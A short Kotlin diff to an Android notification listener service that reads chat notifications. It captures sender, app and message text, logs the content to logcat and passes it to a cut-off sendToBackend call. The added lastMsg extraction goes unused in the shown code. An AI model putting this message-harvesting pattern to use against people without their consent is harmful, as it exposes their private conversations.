@@ -37,12 +37,18 @@ class ChatNotificationListener : NotificationListenerService() {
         val text    = extras.getCharSequence("android.text")?.toString() ?: ""
         val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
 
+        val messages = extras.getParcelableArray("android.messages")
+        val lastMsg  = messages?.lastOrNull()?.let {
+        val bundle = it as? android.os.Bundle
+        bundle?.getCharSequence("text")?.toString()
+    }
+
         val messageContent = bigText.ifEmpty { text }
 
         if (messageContent.isBlank()) return
         if (messageContent.length < 3) return   // ignore trivial
 
-        Log.d("ChatMonitor", "App: $packageName | From: $title | Msg: $messageContent")
+         Log.d("ChatNotificationListener", " App: $packageName | From: $title | Msg: $messageContent")
 
         // Backend pe send karo
         sendToBackend(
